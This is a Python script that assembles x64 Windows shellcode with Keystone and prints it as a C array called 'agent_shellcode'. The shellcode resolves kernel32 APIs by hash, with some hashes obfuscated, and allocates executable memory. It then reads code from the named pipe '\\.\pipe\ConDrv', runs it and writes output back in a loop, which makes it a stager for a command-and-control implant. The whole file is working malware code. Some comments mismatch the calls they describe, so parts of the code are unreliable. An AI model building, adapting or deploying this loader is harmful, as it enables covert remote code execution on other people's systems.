from keystone import *
import ctypes, struct
from datetime import datetime

CODE = (
    " start: "
        " lea rax, [rip]; "
        " sub rax, 0x07;"
        " mov rbp, rsp ;" 
        " mov qword ptr [rbp+0xF8], rax;"
        " add rsp, 0xfffffffffffffdf0h ;" # Avoid NULL bytes

    " find_kernel32: " #
        " xor rcx, rcx ;" # rcx = 0
        " mov rsi,gs:[rcx+0x60] ;" # ESI = &(PEB) ([FS:0x60])
        " mov rsi,[rsi+0x18] ;" # ESI = PEB->Ldr
        " mov rsi,[rsi+0x30] ;" # ESI = PEB->Ldr.InInitOrder
    " next_module: " #
        " mov rbx, [rsi+0x10] ;" # rbx = InInitOrder[X].base_address
        " mov rdi, [rsi+0x40] ;" # EDI = InInitOrder[X].module_name
        " mov rsi, [rsi] ;" # ESI = InInitOrder[X].flink (next)
        " cmp [rdi+12*2], cx ;" # (unicode) modulename[12] == 0x00?
    " jne next_module ;" # No: try next module
    
    " find_function_shorten: " #
        " jmp find_function_shorten_bnc ;" # Short jump
    
    " find_function_ret: " #
        " pop rsi ;" # POP the return address from the stack
        " mov [rbp+0x08], rsi ;" # Save find_function address for later usage
        " jmp resolve_symbols_kernel32 ;" #

    " find_function_shorten_bnc: " #
        " call find_function_ret ;" # Relative CALL with negative offset

    " find_function: " #
        " push rsp ;"
        " push rax ;" # Save all registers
        " push rcx ;" # Save all registers
        " push rdx ;" # Save all registers
        " push rbx ;" # Save all registers
        " push rbp ;" # Save all registers
        " push rsi ;" # Save all registers
        " push rdi ;" # Save all registers
        " mov eax, [rbx+0x3c] ;" # Offset to PE Signature
        " mov edi, [rbx+rax+0x88] ;" # Export Table Directory RVA
        " add rdi, rbx ;" # Export Table Directory VMA
        " mov ecx, [rdi+0x14] ;" # NumberOfNames
        " xor rax, rax ;"
        " mov eax, [rdi+0x20] ;" # AddressOfNames RVA
        " add rax, rbx ;" # AddressOfNames VMA
        " mov [rbp-8], rax ;" # Save AddressOfNames VMA for later
        

    " find_function_loop: " #
        " jecxz find_function_finished ;" # Jump to the end if rcx is 0
        " dec rcx ;" # Decrement our names counter
        " mov rax, [rbp-8] ;" # Restore AddressOfNames VMA
        " mov esi, [rax+rcx*4] ;" # Get the RVA of the symbol name
        " add rsi, rbx ;"
        
    " compute_hash: " #
        " xor eax, eax ;" # NULL EAX
        " cdq ;" # NULL EDX
        " cld ;" # Clear direction

    " compute_hash_again: " #
        " lodsb ;" # Load the next byte from esi into al
        " test al, al ;" # Check for NULL terminator
        " jz compute_hash_finished ;" # If the ZF is set,we've hit the NULL term
        " ror edx, 0x0d ;" # Rotate edx 13 bits to the right
        " add edx, eax ;" # Add the new byte to the accumulator
        " jmp compute_hash_again ;" # Next iteration
        " compute_hash_finished: " #
        
        
        
    " find_function_compare: " #
        
        " cmp rdx, [rsp+0x48] ;" # Compare the computed hash with the requested hash
        " jnz find_function_loop ;" # If it doesn't match go back to find_function_loop
        " mov edx, [rdi+0x24] ;" # AddressOfNameOrdinals RVA
        " add rdx, rbx ;" # AddressOfNameOrdinals VMA
        " mov cx, [rdx+2*rcx] ;" # Extrapolate the function's ordinal
        " mov edx, [rdi+0x1c] ;" # AddressOfFunctions RVA
        " add rdx, rbx ;" # AddressOfFunctions VMA
        " mov eax, [rdx+4*rcx] ;" # Get the function RVA
        " add rax, rbx ;" # Get the function VMA
        " mov [rsp+0x30], rax;"
        
        
        
    " find_function_finished: " #
        
        " pop rdi ;" # Restore registers
        " pop rsi ;" # Restore registers
        " pop rbp ;" # Restore registers
        " pop rbx ;" # Restore registers
        " pop rdx ;" # Restore registers
        " pop rcx ;" # Restore registers
        " pop rax ;" # Restore registers
        " pop rsp ;" # Restore registers
        " ret ;" #

    " resolve_symbols_kernel32: "
 
        " mov r8, 0xFFFFFFFF83FFE85B;"
        " xor r9, r9; "
        " sub r9, r8; "
        " push r9;    "  # CreateFile hash
        " call qword ptr [rbp+0x08] ;" # Call find_function
        " mov qword ptr [rbp+0x10], rax ;" # Save CreateFile address for later usage

        " push 0x16b3fe72 ;" # CreateProcessA hash
        " call qword ptr [rbp+0x08] ;" # Call find_function
        " mov qword ptr [rbp+0x18], rax ;" # Save CreateProcessA address for later usage

      
        " push 0xffd97fb; " # CloseHandle hash
        " call qword ptr [rbp+0x08] ;" # Call find_function
        " mov qword ptr [rbp+0x20], rax ;" # Save CreateThread address for later usage

        " mov rax, 0xFFFFFFFF27C2955F; "
        " mov r8, 0x72bd9cdd; "
        " push r8; " # CreateRemoteThread hash
        " call qword ptr [rbp+0x08] ;" # Call find_function
        " mov qword ptr [rbp+0x28], rax ;" # Save CreateRemoteThread address for later usage

        " push 0x73e2d87e ;" # ExitProcess hash
        " call qword ptr [rbp+0x08] ;" # Call find_function
        " mov qword ptr [rbp+0x30], rax ;" # Save ExitProcess address for later usage

        " mov r8, 0xFFFFFFFF101D6840;"
        " xor r9, r9; "
        " sub r9, r8; "
        " push r9;    "  # OpenProcess hash
        " call qword ptr [rbp+0x08] ;" # Call find_function
        " mov qword ptr [rbp+0x38], rax ;" # Save OpenProcess address for later usage

        " mov rax, 0xFFFFFFFFEF059AEA; "
        " xor r8, r8; "
        " sub r8, rax;"
        " push r8; " # ReadFile hash
        " call qword ptr [rbp+0x08] ;" # Call find_function
        " mov qword ptr [rbp+0x40], rax ;" # Save ReadFile address for later usage

        " mov rax, 0xFFFFFFFF61B5C078; "
        " xor r8, r8; "
        " sub r8, rax; "
        " push r8 ;" # ResumeThread hash
        " call qword ptr [rbp+0x08] ;" # Call find_function
        " mov qword ptr [rbp+0x48], rax ;" # Save ResumeThread address for later usage


        " mov rax, 0xFFFFFFFF6E5035AC; "
        " xor r8, r8; "
        " sub r8, rax; "
        " push r8 ;" # VirtualAlloc hash
        " call qword ptr [rbp+0x08] ;" # Call find_function
        " mov qword ptr [rbp+0x50], rax ;" # Save VirtualAlloc address for later usage

        " mov rax, 0xFFFFFFFF91E56A64; "
        " xor r8, r8; "
        " sub r8, rax; "
        " push r8 ;" # VirtualAllocEx hash
        " call qword ptr [rbp+0x08] ;" # Call find_function
        " mov qword ptr [rbp+0x58], rax ;" # Save VirtualAllocEx address for later usage

        " push 0x30633ac ;" # VirtualFree hash
        " call qword ptr [rbp+0x08] ;" # Call find_function
        " mov qword ptr [rbp+0x60], rax ;" # Save VirtualFree address for later usage
        
        " mov rax, 0xFFFFFFFF0BA5D4E0;"
        " xor r8, r8; "
        " sub r8, rax; "
        " push r8 ;" # VirtualQueryEx hash
        " call qword ptr [rbp+0x08] ;" # Call find_function
        " mov qword ptr [rbp+0x68], rax ;" # Save VirtualQueryEx address for later usage

        " mov rax, 0xFFFFFFFF17F586E1; "
        " xor r8, r8; "
        " sub r8, rax;"
        " push r8; " # WriteFile hash
        " call qword ptr [rbp+0x08] ;" # Call find_function
        " mov qword ptr [rbp+0x70], rax ;" # Save WriteFile address for later usage

        " mov rax, 0xFFFFFFFF31FA2653; "
        " xor r8, r8; "
        " sub r8, rax;"
        " push r8; " # WaitForSingleObject hash
        " call qword ptr [rbp+0x08] ;" # Call find_function
        " mov qword ptr [rbp+0x78], rax ;" # Save WaitForSingleObject address for later usage
        
        " mov rax, 0xFFFFFFFF27C2955F; "
        " xor r8, r8; "
        " sub r8, rax;"
        " push r8; " # WriteProcessMemory hash
        " call qword ptr [rbp+0x08] ;" # Call find_function
        " mov qword ptr [rbp+0x80], rax ;" # Save WriteProcessMemory address for later usage

        " mov rax, 0xFFFFFFFF8A25E69A; "
        " xor r8, r8; "
        " sub r8, rax;"
        " push r8; " # GetLastError hash
        " call qword ptr [rbp+0x08] ;" # Call find_function
        " mov qword ptr [rbp+0xD0], rax ;" # Save GetLastError address for later usage


    "exec_shellcode:"
        
        # VirtualAlloc
        " xor rcx, rcx; "
        " mov rdx, 0xF4240; "
        " mov r8, 0x3000; "
        " mov r9, 0x40; "
        " push r9; "
        " push r8; "
        " push rdx; "
        " push rcx; "
        " lea rbx, [rip]; " # ROP call function
        " add rbx, 0x0b;"
        " push rbx; "
        " mov rbx, [rbp+0x50]; "
        " push rbx; "
        " ret; "
        " mov qword ptr [rbp+0xB0], rax; "
        # WaitForSingleObject
        " mov rcx, 0xFFFFFFFFFFFFFFFE; "
        " mov rdx, 500; "
        " push rdx; "
        " push rcx; "
        " lea rbx, [rip]; " # ROP call function
        " add rbx, 0x0b;"
        " push rbx; "
        " mov rbx, [rbp+0x78]; "
        " push rbx; "
        " ret; "
        " CreateFile:"
        # CreateFile
        " mov rax, 0x7672446e6f435c;"
        " push rax;"
        " mov rax, 0x657069705c2e5c5c;"
        " push rax;"
        " mov rcx, rsp; "
        " mov rdx, 0xC0000000;"
        " mov r8, 0x00000003; "
        " xor r9, r9; "
        " push r9; "
        " mov rax, 0x80;"
        " push rax; "
        " mov rax, 0x03; "
        " push rax; "
        " push r9; "
        " push r8; "
        " push rdx; "
        " push rcx; "
        " lea rbx, [rip]; " # ROP call function
        " add rbx, 0x0b;"
        " push rbx; "
        " mov rbx, [rbp+0x10]; "
        " push rbx; "
        " ret;  "
        " mov qword ptr [rbp+0x88], rax; "
        " cmp rax, 0x00; "
        " ReadFile:"
        # WaitForSingleObject
        " mov rcx, 0xFFFFFFFFFFFFFFFE; "
        " mov rdx, 0x100;"
        " lea rbx, [rip]; " # Rop return
        " add rbx, 0x0b;"
        " push rbx; "
        " mov rbx, [rbp+0x68];"
        " push rbx; "
        " ret; "
        " je CreateFile;"
        # ReadFile
        " mov rcx, [rbp+0x88]; "
        " mov rdx, [rbp+0xB0]; "
        " mov r8, 0x1000; " # size=4096
        " mov r9, rsp; "
        " xor r10, r10; "
        " push r10; "
        " push r9; "
        " push r8; "
        " push rdx; "
        " push rcx; "
        " lea rbx, [rip]; " # ROP call function
        " add rbx, 0x0b;"
        " push rbx; "
        " mov rbx, [rbp+0x40]; "
        " push rbx; "
        " ret;  "
        # Return to shellcode
        " lea rbx, [rip]; " # ROP call function
        " add rbx, 0x14;"
        " mov qword ptr [rbp+0xC0], rbx;"
        " mov rbx, [rbp+0xB0]; "
        " push rbx; "
        " ret; "
        # WriteFile
        " mov rcx, [rbp+0x88]; "        
        " lea rdx, [rbp+0x90]; "
        #" add rdx, 0x90;"
        #" mov qword ptr [rbp+0xF0], rdx;"
        #" mov rdx, [rbp+0xF0];"           
        " mov r8, 0x20; " # nNumberOfBytesToWrite
        " mov r9, rsp; " # lpNumberOfBytesWritten
        " xor rbx, rbx; " # Overlapped
        " push rbx; "
        " push r9; "
        " push r8; "
        " push rdx; "
        " push rcx; "
        " lea rbx, [rip]; " # Rop return
        " add rbx, 0x0b;"
        " push rbx; "
        " mov rbx, [rbp+0x70];"
        " push rbx; "
        " ret; "
       
        " jmp ReadFile;"
        

)
ks = Ks(KS_ARCH_X86, KS_MODE_64)
encoding, count = ks.asm(CODE)
instructions = ""
i=1
for dec in encoding: 
    if(i % 20 == 0) and (i<len(encoding)):
        instructions += "\\x{0:02x}".format(int(dec)).rstrip("\r\n")
        instructions += "\"\r\n\""
    else:
        instructions += "\\x{0:02x}".format(int(dec)).rstrip("\r\n") 
    i+=1
print("// Timestamp: " + str(datetime.now()))
print("unsigned char agent_shellcode[] = (\r\n\"" + instructions + "\");\r\n")
print("// Size: " + str(len(encoding)))



